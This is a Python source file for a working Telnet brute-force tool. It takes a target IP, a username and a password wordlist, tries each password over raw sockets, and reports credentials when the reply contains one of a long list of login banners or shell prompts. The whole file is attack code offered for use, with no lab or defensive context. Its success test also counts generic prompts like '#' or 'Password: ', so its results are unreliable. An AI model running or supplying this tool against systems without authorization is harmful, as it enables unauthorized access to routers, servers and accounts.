#!/usr/bin/env python3
# Telnet Brute Force

import argparse
import socket
import sys
import signal
import time
import threading

RED = "\033[38;2;255;0;0m"
RESET = "\033[0m"
BOLD = "\033[1m"

DEFAULT_PORT = 23

# Expanded banners for different devices and systems
BANNERS = [
    "Login the CLI by",          # Your specific success banner
    "Welcome",                   # Generic success banner
    "login successful",          # Generic login success
    "Access granted",            # Generic access granted message
    "Welcome back",              # Welcome message for repeated login
    "Login Success",             # Login success variant
    "Authenticated",             # Authentication success
    "Connection Established",    # Some devices may use this after successful login
    "Last login",                # Common Linux/Unix login message
    "Linux",                     # Banner seen after login on Linux servers
    "Welcome to Ubuntu",         # Ubuntu login banner
    "Debian GNU/Linux",          # Debian login banner
    "Microsoft Windows",         # Windows login banner
    "Microsoft Windows [Version",# Windows version login banner
    "Router> ",                  # Router prompt, typically Cisco
    "Switch> ",                  # Switch prompt, typically Cisco
    "Enable",                    # Cisco devices after login
    "Press ENTER to continue",   # Some systems display this after login
    "BusyBox v",                 # Embedded Linux systems (often in routers)
    "root@ubuntu",               # Root prompt on Ubuntu
    "Login as",                  # Common banner for Linux systems
    "User Access Verification",  # Some Cisco devices after login
    "Enter password",            # Some routers or switches
    "Accessing CLI",             # Router or switch access
    "Enter your password",       # Common message for generic devices
    "admin#",                    # Common admin prompt on some routers
    "Login: ",                   # General Linux login prompt
    "Password: ",                # General password prompt
    "Welcome to the CLI",        # Generic banner
    "BusyBox v1.2.1",            # Another variant of embedded Linux
    "Login successful, type 'help' for a list of available commands",  # Some switches
    "Telnet login successful",   # Telnet-specific login message
    "Successful login",          # Generic successful login message
    "Welcome to OpenWRT",        # OpenWRT routers (Linux-based)
    "Cisco IOS",                 # Cisco IOS banner
    "System Login",              # Some switches/routers display this
    "Microsoft Telnet Server",
    ">",
    "#",
    "$",
]

SUCCESS_BANNER_TEMPLATE = "Login the CLI by {}"

stopTimer = False
progressLine = ""
timerThread = None
stdoutLock = threading.Lock()

def UpdateTimer(startTime):
    while not stopTimer:
        elapsed = time.time() - startTime
        elapsedFmt = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        with stdoutLock:
            # clear and rewrite the progress line
            sys.stdout.write("\r\033[K" + progressLine + "\n")
            # write duration on the next line (no clearing)
            sys.stdout.write(f"Duration: {BOLD}{elapsedFmt}{RESET}")
            # move cursor back up so next progress update overwrites correctly
            sys.stdout.write("\033[F")
            sys.stdout.flush()
        time.sleep(1)

def TelnetBruteForce(host, port, username, passwords):
    global stopTimer, progressLine, timerThread

    total = len(passwords)
    attempts = 0

    print(f"{RED}\n[*] Starting brute force: {username}@{host}:{port} ({total} passwords){RESET}")
    startTime = time.time()

    progressLine = f"Attempts: {BOLD}0/{total}{RESET} | Last: {BOLD}---{RESET}"
    stopTimer = False
    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
    timerThread.start()

    for pwd in passwords:
        attempts += 1
        progressLine = f"Attempts: {BOLD}{attempts}/{total}{RESET} | Last: {BOLD}{pwd}{RESET}"
        with stdoutLock:
            sys.stdout.write("\r\033[K" + progressLine)
            sys.stdout.flush()

        if TryPassword(host, port, username, pwd):
            print(f"\n\n{RED}[+] SUCCESS:{RESET} \n{RED}Username: {RESET}{BOLD}{username}{RESET}\n{RED}Password: {RESET}{BOLD}{pwd}{RESET}")
            stopTimer = True
            timerThread.join()
            return

    stopTimer = True
    timerThread.join()
    print(f"\n\n{RED}[-] No valid password found.{RESET}")

def TryPassword(host, port, username, password):
    try:
        # Create socket and connect to target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))

        # Read until we get 'User:' prompt (Telnet)
        sock.send(b"\r\n")  # Send an initial newline to get the prompt
        time.sleep(0.2)  # Wait for the prompt to come back
        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string

        if not any(prompt in data for prompt in ["User:","user:","Login:","login","Username:","username"]): 
            sock.close()
            return False

        # Send username
        sock.send((username + "\r\n").encode())
        time.sleep(0.2)  # Give some time for the prompt to come back

        # Expecting password prompt
        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
        if not any(prompt in data for prompt in ["Password","password:","Enter password:","enter password:","Enter your password:","enter your password:","Enter the password:","enter the password"]):
            sock.close()
            return False

        # Send password
        sock.send((password + "\r\n").encode())
        time.sleep(0.2)

        # Get the output after sending the password
        output = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
        sock.close()

        # Check if any of the success banners are in the output
        for banner in BANNERS:
            if banner in output:
                return True

        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        try:
            sock.close()
        except:
            pass

def LoadPasswords(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] Wordlist not found: {path}{RESET}")
        sys.exit(1)

def menu():
    host = input(f"\n{RED}Target IP: {RESET}").strip()
    username = input(f"{RED}Username: {RESET}").strip()
    wordlist = input(f"{RED}Wordlist [default: passwords.txt]: {RESET}").strip() or "passwords.txt"
    passwords = LoadPasswords(wordlist)
    TelnetBruteForce(host, DEFAULT_PORT, username, passwords)

def terminal():
    parser = argparse.ArgumentParser(
        description="Telnet Brute Force Tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-u", "--username", required=True, help="Username to brute")
    parser.add_argument("-w", "--wordlist", default="passwords.txt",
                        help="Path to wordlist (default: passwords.txt)")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT,
                        help=f"Telnet port (default: {DEFAULT_PORT})")
    args = parser.parse_args()
    passwords = LoadPasswords(args.wordlist)
    TelnetBruteForce(args.target, args.port, args.username, passwords)

def SignalHandler(sig, frame):
    global stopTimer, timerThread
    print(f"\n{RED}Stopping the attack...{RESET}")
    stopTimer = True
    if timerThread and timerThread.is_alive():
        timerThread.join()
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
